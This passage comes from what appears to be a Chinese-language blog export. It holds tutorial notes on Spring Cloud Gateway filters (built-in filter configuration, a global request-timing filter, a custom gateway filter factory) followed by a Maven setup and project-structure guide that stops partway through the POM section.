Path=/XYZ/abc/&#123;segment&#125;   # 断言，为配合SetPath测试，&#123;segment&#125;的内容最后被SetPath取代</span></span><br><span class="line">          <span class="comment"># 过滤器配置，需要添加此项</span></span><br><span class="line">          <span class="attr">filters:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">AddRequestHeader=X-Request-fu1,Value1</span>  <span class="comment"># 请求头k-v，若一头含有多参则重写一行设置</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">AddRequestHeader=X-Request-fu2,Value2</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">AddRequestParameter=customerId,9527001</span> <span class="comment"># 新增请求参数Parameter：k ，v</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SetResponseHeader=Date,2099-11-11</span> <span class="comment"># 设置回应头Date值为2099-11-11</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SetPath=/pay/gateway/&#123;segment&#125;</span>  <span class="comment"># &#123;segment&#125;表示占位符，segment你写为abc也行但要上下一致</span></span><br><span class="line">            <span class="comment"># 访问http://localhost:9527/pay/gateway/filter会跳转到http://www.baidu.com/</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">RedirectTo=302,</span> <span class="string">http://www.baidu.com/</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>说明</strong></p>
<ul>
<li><p><code>AddRequestParameter</code>添加请求参数时</p>
<ul>
<li>如果原URL中已经有请求参数且配置文件中配置的请求参数默认值不为NULL，则按原值</li>
<li>如果配置文件中配置的请求参数默认值为NULL，则不管原URL中是否已经有请求参数，值均为NULL</li>
</ul>
</li>
<li><p><code>SetPath</code>过滤器，假如浏览器输入的访问路径为<code>/XYZ/abc/filter</code>，则会被自动替换为<code>/pay/gateway/filter</code>，进而访问<code>/pay/gateway/filter</code>接口</p>
</li>
</ul>
<h4 id="自定义全局过滤器"><a href="#自定义全局过滤器" class="headerlink" title="自定义全局过滤器"></a>自定义全局过滤器</h4><p>编写步骤：</p>
<p><strong>步骤1：定义一个GlobalFilter类，实现GlobalFilter、Ordered两个接口</strong></p>
<p><strong>步骤2：实现filter和getOrder方法</strong></p>
<p>以下是一个全局接口性能监控过滤器实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义全局过滤器，用于拦截和处理所有通过 Spring Cloud Gateway 的请求。</span></span><br><span class="line"><span class="comment"> * 该类实现了 GlobalFilter 和 Ordered 接口，可以对请求进行预处理和后处理，并定义执行顺序。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyGlobalFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义过滤器的执行顺序。数字越小，优先级越高。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回过滤器的执行顺序值。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BEGIN_VISIT_TIME</span> <span class="operator">=</span> <span class="string">&quot;begin_visit_time&quot;</span>; <span class="comment">// 请求开始访问时间的属性键名</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实现 GlobalFilter 的核心方法，用于拦截并处理请求。</span></span><br><span class="line"><span class="comment">     * 本版本实现了以下功能：</span></span><br><span class="line"><span class="comment">     * - 记录请求的开始时间。</span></span><br><span class="line"><span class="comment">     * - 在请求完成后统计访问接口的主机、端口、URL、参数及耗时。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exchange 当前的 ServerWebExchange 对象，包含请求和响应信息。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> chain GatewayFilterChain 对象，用于将请求传递到下一个过滤器或目标服务。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回 Mono&lt;Void&gt;，表示异步操作的结果。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">// 将当前请求的开始时间记录到 exchange 的属性中</span></span><br><span class="line">        exchange.getAttributes().put(BEGIN_VISIT_TIME, System.currentTimeMillis());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 继续传递请求到下一个过滤器或目标服务，并在完成后执行日志记录逻辑</span></span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange).then(Mono.fromRunnable(() -&gt; &#123;</span><br><span class="line">            <span class="type">Long</span> <span class="variable">beginVisitTime</span> <span class="operator">=</span> exchange.getAttribute(BEGIN_VISIT_TIME); <span class="comment">// 获取请求开始时间</span></span><br><span class="line">            <span class="keyword">if</span> (beginVisitTime != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 记录访问接口的耗时</span></span><br><span class="line">                log.info(<span class="string">&quot;访问接口时长: &quot;</span> + (System.currentTimeMillis() - beginVisitTime) + <span class="string">&quot;ms&quot;</span>);</span><br><span class="line">                System.out.println();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在 Spring Cloud Gateway 中，<code>ServerWebExchange</code> 是一个核心对象，它封装了请求和响应的所有信息。<code>exchange.getAttributes()</code> 提供了一个可变的 <code>Map</code>，用于存储与当前请求相关的上下文数据。这些数据可以在过滤器链的不同阶段被共享和访问。</p>
<p>在全局过滤器中，<code>filter</code> 方法分为两个主要阶段：</p>
<ol>
<li><strong>请求处理前</strong>：在调用 <code>chain.filter(exchange)</code> 之前执行的逻辑。</li>
<li><strong>请求处理后</strong>：在 <code>chain.filter(exchange)</code> 完成后执行的逻辑（通过 <code>.then(...)</code> 实现）。</li>
</ol>
<p>如果需要在请求处理前记录某些数据，并在请求处理后使用这些数据，就必须有一个机制来跨阶段共享这些数据。<code>exchange.getAttributes()</code> 提供了一个完美的解决方案，因为它是一个与当前请求绑定的共享上下文，可以在过滤器链的不同阶段安全地访问和修改。</p>
<p><strong>配置：</strong>全局过滤器对所有经过网关的请求均生效，无需特别配置</p>
<h4 id="自定义局部过滤器"><a href="#自定义局部过滤器" class="headerlink" title="自定义局部过滤器"></a>自定义局部过滤器</h4><p>编写步骤：</p>
<p><strong>步骤1：定义一个XXXGatewayFilterFactory类，继承AbstractGatewayFilterFactory类</strong></p>
<p><strong>步骤2：在Factory类内部编写config配置类</strong></p>
<p><strong>步骤3：编写无参构造函数</strong></p>
<p><strong>步骤4：重写apply方法</strong></p>
<p><strong>步骤5：重写shortcutFieldOrder方法，开启短格式配置支持</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义网关过滤器工厂，用于创建自定义的 GatewayFilter。</span></span><br><span class="line"><span class="comment"> * 该类继承了 AbstractGatewayFilterFactory，并通过 Config 类定义过滤器的配置参数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyGatewayFilterFactory</span> <span class="keyword">extends</span> <span class="title class_">AbstractGatewayFilterFactory</span>&lt;MyGatewayFilterFactory.Config&gt; &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造函数，调用父类构造函数并传入 Config 类型。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyGatewayFilterFactory</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(MyGatewayFilterFactory.Config.class);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 实现 apply 方法，用于创建并返回具体的 GatewayFilter。</span></span><br><span class="line"><span class="comment">     * 该方法根据传入的配置对象（Config）生成一个自定义的过滤器逻辑。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> config 配置对象，包含过滤器所需的参数。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个自定义的 GatewayFilter。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> GatewayFilter <span class="title function_">apply</span><span class="params">(MyGatewayFilterFactory.Config config)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GatewayFilter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">                <span class="comment">// 获取当前请求对象</span></span><br><span class="line">                <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 打印进入自定义过滤器的日志，并输出配置的状态值</span></span><br><span class="line">                System.out.println(<span class="string">&quot;进入了自定义网关过滤器 MyGatewayFilterFactory，status：&quot;</span> + config.getStatus());</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 判断请求参数中是否包含 &quot;fu&quot; 键</span></span><br><span class="line">                <span class="keyword">if</span> (request.getQueryParams().containsKey(<span class="string">&quot;fu&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 如果包含，则继续传递请求到下一个过滤器或目标服务</span></span><br><span class="line">                    <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 如果不包含，则设置响应状态码为 400 Bad Request，并结束请求处理</span></span><br><span class="line">                    exchange.getResponse().setStatusCode(HttpStatus.BAD_REQUEST);</span><br><span class="line">                    <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 定义快捷字段顺序，用于在 YAML 或其他配置文件中指定配置项时的顺序。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个包含配置字段名称的列表。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;String&gt; <span class="title function_">shortcutFieldOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.asList(<span class="string">&quot;status&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置类，用于定义过滤器的参数。</span></span><br><span class="line"><span class="comment">     * 该类通过 Getter 和 Setter 方法提供对参数的访问和修改。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Config</span> &#123;</span><br><span class="line">        <span class="meta">@Getter</span> <span class="meta">@Setter</span></span><br><span class="line">        <span class="keyword">private</span> String status; <span class="comment">// 设定一个状态值/标志位，用于匹配请求条件</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>说明</strong>：</p>
<p><code>status</code> 字段可以用来动态控制过滤器的行为。例如：</p>
<ul>
<li>如果 <code>status</code> 的值为 <code>&quot;active&quot;</code>，则执行某些特定逻辑。</li>
<li>如果 <code>status</code> 的值为 <code>&quot;inactive&quot;</code>，则跳过某些逻辑。</li>
</ul>
<p>如在apply中添加处理逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&quot;active&quot;</span>.equals(config.getStatus())) &#123;</span><br><span class="line">    <span class="comment">// 执行某些特定逻辑</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 跳过某些逻辑</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>配置：</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">filters:</span></span><br><span class="line">	<span class="comment"># My与上述定义类时的XXX对应，即GatewayFilterFactory的前缀</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">My=fu</span></span><br></pre></td></tr></table></figure>

<p><strong>解析过程</strong>：</p>
<ol>
<li>Spring Cloud Gateway 识别到 <code>filters</code> 中有一个名为 <code>My</code> 的过滤器。</li>
<li>根据过滤器名称 <code>My</code>，找到对应的过滤器工厂 <code>MyGatewayFilterFactory</code>。</li>
<li>将 <code>=fu</code> 的值解析为 <code>Config</code> 类中的 <code>status</code> 字段，并将其设置为 <code>&quot;fu&quot;</code>。</li>
<li>使用该配置创建过滤器实例，并应用到路由中</li>
</ol>
<p>=============	【<strong>本文终结</strong>】	=============</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>微服务</tag>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Maven-Note</title>
    <url>/2024/08/11/Java-Maven-Note/</url>
    <content><![CDATA[<p><code>Maven</code>是一款为 Java 项目管理构建、依赖管理的工具（软件），使用 <code>Maven</code>可以自动化构建、测试、打包和发布项目，大大提高了开发效率和质量。</p>
<span id="more"></span>

<h2 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h2><p><a href="https://maven.apache.org/download.cgi">Maven官网</a></p>
<p>Maven就是一个软件，掌握安装、配置、以及基本功能 <strong>（项目构建、依赖管理）</strong> 的理解和使用即可！</p>
<ol>
<li><strong>依赖管理：</strong><br><code>Maven</code>可以管理项目的依赖，包括自动下载所需依赖库、自动下载依赖需要的依赖并且保证版本没有冲突、依赖版本管理等。通过 Maven，我们可以方便地维护项目所依赖的外部库，避免版本冲突和转换错误等，而我们仅仅需要编写配置即可。</li>
<li><strong>构建管理：</strong><br>项目构建是指将源代码、配置文件、资源文件等转化为能够运行或部署的应用程序或库的过程<br><code>Maven</code>可以管理项目的编译、测试、打包、部署等构建过程。通过实现标准的构建生命周期，<code>Maven</code>可以确保每一个构建过程都遵循同样的规则和最佳实践。同时，<code>Maven</code>的插件机制也使得开发者可以对构建过程进行扩展和定制。主动触发构建，只需要简单的命令操作即可。</li>
</ol>
<p><strong>Maven工作原理</strong></p>
<p>清理-&gt;编译-&gt;测试-&gt;报告-&gt;打包-&gt;安装-&gt;部署</p>
<p><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240811155241.png" alt="示意图"><br>Maven工具的工作原理可以概括为以下几个方面：</p>
<ol>
<li>项目对象模型（POM）<br> 定义项目结构：Maven通过项目根目录下的pom.xml文件来定义项目的基本信息、依赖关系和构建过程等。这个文件是Maven项目的核心配置文件，被称为项目对象模型（Project Object Model，POM）。<br> 内容结构：pom.xml文件中包含了项目的groupId（公司或组织的唯一标识符）、artifactId（项目或模块的唯一标识符）、version（版本号）、packaging（打包方式）等基本信息，以及项目的依赖项、插件和构建配置等。</li>
<li>依赖管理<br> 自动下载依赖：在pom.xml文件中定义项目所需的依赖项（包括Java类库、框架和插件等），Maven会根据这些依赖信息自动从配置的仓库（如本地仓库、中央仓库或远程仓库）中下载并管理所需的依赖项。<br> 传递性依赖：Maven还支持传递性依赖，即当一个依赖项依赖于其他依赖项时，Maven会自动解析并下载这些传递性依赖项。</li>
<li>构建生命周期和插件<br> 构建生命周期：Maven定义了一组标准的构建生命周期，包括clean（清理）、compile（编译）、test（测试）、package（打包）和install（安装）等阶段。每个生命周期阶段都可以绑定一个或多个插件目标来执行特定的任务。<br> 插件：插件是Maven的核心功能之一，它们是可插拔的组件，用于在构建生命周期的各个阶段执行特定的任务。例如，Maven Compiler Plugin用于编译Java源代码，Maven Surefire Plugin用于运行单元测试等。</li>
<li>构建过程<br> 执行构建命令：当执行Maven构建命令（如mvn compile、mvn test、mvn package等）时，Maven会根据pom.xml文件中的配置信息，按照定义的生命周期和插件执行构建过程。<br> 生成构建产物：构建过程包括编译源代码、运行测试、打包生成可执行的JAR文件或WAR文件等。Maven还会生成详细的构建报告，包括编译错误、测试结果和代码覆盖率等信息，以便开发人员进行代码质量管理。</li>
<li>仓库管理<br> 本地仓库和远程仓库：Maven会自动将项目打包生成的文件（如JAR文件）上传到本地仓库中，以便其他项目可以共享和使用。同时，Maven还支持从远程仓库（如中央仓库）中下载依赖项。<br> settings.xml配置：Maven的全局配置文件settings.xml通常位于Maven安装目录下的conf文件夹中，用于配置本地仓库的路径、远程仓库的身份验证信息、代理服务器和镜像仓库等。</li>
</ol>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>前提：必须有java环境且有JavaHome项环境变量<br>配置：</p>
<ol>
<li>配置MAVEN_HOME系统变量，路径为压缩包解压后的文件夹路径</li>
<li>配置环境变量：%MAVEN_HOME%\bin</li>
</ol>
<p>验证：cmd执行mvn -v</p>
<h3 id="Maven功能配置"><a href="#Maven功能配置" class="headerlink" title="Maven功能配置"></a>Maven功能配置</h3><p>需要修改MAVEN_HOME指定路径下<strong>conf&#x2F;settings.xml</strong>配置文件，来修改maven的一些默认配置。主要修改的有三个配置：</p>
<ol>
<li>依赖本地缓存位置（本地仓库位置） <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- localRepository</span></span><br><span class="line"><span class="comment">| The path to the local repository maven will use to store artifacts.</span></span><br><span class="line"><span class="comment">|</span></span><br><span class="line"><span class="comment">| Default: $&#123;user.home&#125;/.m2/repository</span></span><br><span class="line"><span class="comment">&lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- conf/settings.xml 55行 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>D:\maven-repository<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置国内阿里镜像<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--在mirrors节点(标签)下添加中央仓库镜像 160行附近--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
<li>配置jdk17版本项目构建<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--在profiles节点(标签)下添加jdk编译版本 268行附近--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-17<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activation</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">jdk</span>&gt;</span>17<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activation</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>17<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>17<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>17<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="IDEA配置本地Maven软件"><a href="#IDEA配置本地Maven软件" class="headerlink" title="IDEA配置本地Maven软件"></a>IDEA配置本地Maven软件</h3><p>idea工具默认自带maven配置软件，但是因为没有修改配置，建议替换成本地配置好的maven<br>设置 -&gt; 构建、执行、部署 -&gt; Maven</p>
<ol>
<li>Maven主路径设置MAVEN_Home一致的路径</li>
<li>用户设置文件勾选重写，改为修改的配置文件settings.xml所在路径</li>
<li>本地仓库应当可以自动识别，无法自动识别说明配置文件错误。实在不行勾选重写，设置路径</li>
</ol>
<p><strong>注意</strong>：<br>1、如果本地仓库地址不变化，只有一个原因，就是maven&#x2F;conf&#x2F;settings.xml配置文件编写错误！仔细检查即可！<br>2、一定保证User settings file对应之前修改的settings.xml的路径，若 不一致，选中Override复选框，手动选</p>
<h2 id="IDEA创建Maven工程"><a href="#IDEA创建Maven工程" class="headerlink" title="IDEA创建Maven工程"></a>IDEA创建Maven工程</h2><p>Maven工程相对JAV项目，多出一组gavp属性，gav需要我们在创建项目的时候指定，p有默认值，我们先行了解下这组属性的含义：<br>创建Maven工程需要指定gavp属性，p有默认值。GAVP 是<code>GroupId、ArtifactId、Version、Packaging</code>等四个属性的缩写，其中前三个是必要的，而Packaging属性为可选项。这四个属性主要为每个项目在maven仓库中做一个标识，类似人的姓-名！有了具体标识，方便后期项目之间相互引用依赖等！</p>
<p><strong>GAVP规则：</strong></p>
<ol>
<li><strong>GroupID 格式</strong>：com.{公司&#x2F;BU}.业务线.[子业务线]，最多 4 级。<br>说明：{公司&#x2F;BU} 例如：alibaba&#x2F;taobao&#x2F;tmall&#x2F;aliexpress 等BU一级；子业务线可选。<br>正例：com.taobao.tddl 或 com.alibaba.sourcing.multilang</li>
<li><strong>ArtifactID 格式</strong>：产品线名-模块名。语义不重复不遗漏，先到仓库中心去查证一下。<br>正例：tc-client &#x2F; uic-api &#x2F; tair-tool &#x2F; bookstore</li>
<li><strong>Version版本号格式推荐</strong>：主版本号.次版本号.修订号<ol>
<li>主版本号：当做了不兼容的 API 修改，或者增加了能改变产品方向的新功能。</li>
<li>次版本号：当做了向下兼容的功能性新增（新增类、接口等）。</li>
<li>修订号：修复 bug，没有修改方法签名的功能加强，保持 API 兼容性。<br>​		例如： 初始→1.0.0  修改bug → 1.0.1  功能调整 → 1.1.1等</li>
</ol>
</li>
<li><strong>Packaging定义规则：</strong><br>​	指示将项目打包为什么类型的文件，idea根据packaging值，识别maven项目类型！<br>​	packaging 属性为 jar（默认值），代表普通的Java工程，打包以后是.jar结尾的文件。<br>​	packaging 属性为 war，代表Java的web工程，打包以后.war结尾的文件。<br>​	packaging 属性为 pom，代表不会打包，用来做继承的父工程。</li>
</ol>
<h3 id="IDEA中创建普通Maven工程"><a href="#IDEA中创建普通Maven工程" class="headerlink" title="IDEA中创建普通Maven工程"></a><strong>IDEA中创建普通Maven工程</strong></h3><p>右键，新建，新模块，需要更改三项</p>
<ol>
<li>构建系统选择Maven</li>
<li>高级设置-&gt;组ID即上文提到的GroupID，示例：com.test.maven</li>
<li>高级设置-&gt;工件ID即上文ArtifactID，一般可自动识别为模块名</li>
</ol>
<p>右侧边栏可见Maven管理标志，点击</p>
<ul>
<li>可能见红色报错，待其自动下载Maven所需插件后即可</li>
<li>配置文件下可见上文在settings.xml中配置的java版本</li>
<li>修改pom.xml文件后必须点击左上角刷新配置</li>
</ul>
<p>此时模块下Src文件分为main目录和test目录，此后编程过程中</p>
<ul>
<li>main目录下只能放核心程序</li>
<li>test目录下只能放测试程序</li>
</ul>
<p>同时还有一个POM.xml配置文件，</p>
<ul>
<li><code>version</code>标签即对应上文提到的版本号，可以更改为实际版本号，去除<code>-SNAPSHOT</code></li>
<li>可以补充<code>packaging</code>，不补充时默认为<code>jar</code>，即按Java工程打包，可根据实际情况更改。  <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p>使用插件&#x2F;依赖的流程：<br>方法1：</p>
<ul>
<li>访问<a href="https://mvnrepository.com/">Maven插件查询</a></li>
<li>搜索需要的插件&#x2F;依赖，选择使用较多的版本，点击，下滑复制其Maven配置代码</li>
<li>粘贴到pom.xml中的dependencies标签下（没有则创建）；刷新配置即可自动下载。</li>
</ul>
<h3 id="IDEA中创建JavaWeb的Maven工程"><a href="#IDEA中创建JavaWeb的Maven工程" class="headerlink" title="IDEA中创建JavaWeb的Maven工程"></a><strong>IDEA中创建JavaWeb的Maven工程</strong></h3><p>首先按上述方法创建普通Maven工程，POM.xml配置文件，packaging标签改为war，刷新配置</p>
<p>（后面补充）</p>
<h3 id="Maven工程项目结构说明"><a href="#Maven工程项目结构说明" class="headerlink" title="Maven工程项目结构说明"></a>Maven工程项目结构说明</h3><p><code>Maven</code>是一个强大的构建工具，它提供一种标准化的项目结构，可以帮助开发者更容易地管理项目的依赖、构建、测试和发布等任务。以下是 Maven Web 程序的文件结构及每个文件的作用：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">|-- pom.xml                               # Maven 项目管理文件 </span><br><span class="line">|-- src</span><br><span class="line">    |-- main                              # 项目主要代码</span><br><span class="line">    |   |-- java                          # Java 源代码目录</span><br><span class="line">    |   |   `-- com/example/myapp         # 开发者代码主目录</span><br><span class="line">    |   |       |-- controller            # 存放 Controller 层代码的目录</span><br><span class="line">    |   |       |-- service               # 存放 Service 层代码的目录</span><br><span class="line">    |   |       |-- dao                   # 存放 DAO 层代码的目录</span><br><span class="line">    |   |       `-- model                 # 存放数据模型的目录</span><br><span class="line">    |   |-- resources                     # 资源目录，存放配置文件、静态资源等</span><br><span class="line">    |   |   |-- log4j.properties          # 日志配置文件</span><br><span class="line">    |   |   |-- spring-mybatis.xml        # Spring Mybatis 配置文件</span><br><span class="line">    |   |   `-- static                    # 存放静态资源的目录</span><br><span class="line">    |   |       |-- css                   # 存放 CSS 文件的目录</span><br><span class="line">    |   |       |-- js                    # 存放 JavaScript 文件的目录</span><br><span class="line">    |   |       `-- images                # 存放图片资源的目录</span><br><span class="line">    |   `-- webapp                        # 存放 WEB 相关配置和资源</span><br><span class="line">    |       |-- WEB-INF                   # 存放 WEB 应用配置文件</span><br><span class="line">    |       |   |-- web.xml               # Web 应用的部署描述文件</span><br><span class="line">    |       |   `-- classes               # 存放编译后的 class 文件</span><br><span class="line">    |       `-- index.html                # Web 应用入口页面</span><br><span class="line">    `-- test                              # 项目测试代码</span><br><span class="line">        |-- java                          # 单元测试目录</span><br><span class="line">        `-- resources                     # 测试资源目录</span><br></pre></td></tr></table></figure>

<p>重要文件&#x2F;目录介绍：</p>
<ul>
<li>pom.xml：Maven 项目管理文件，用于描述项目的依赖和构建配置等信息。</li>
<li>src&#x2F;main&#x2F;java：存放项目的 Java 源代码。</li>
<li>src&#x2F;main&#x2F;resources：存放项目的资源文件，如配置文件、静态资源等。</li>
<li>src&#x2F;main&#x2F;webapp&#x2F;WEB-INF：存放 Web 应用的配置文件。</li>
<li>src&#x2F;main&#x2F;webapp&#x2F;index.jsp：Web 应用的入口页面。</li>
<li>src&#x2F;test&#x2F;java：存放项目的测试代码。</li>
<li>src&#x2F;test&#x2F;resources：存放测试相关的资源文件，如测试配置文件等。</li>
</ul>
<h3 id="POM核心配置文件解读"><a href="#POM核心配置文件解读" class="headerlink" title="POM核心配置文件解读"></a>POM核心配置文件解读</h3><p>POM文件的主要内容及其功能如下：</p>
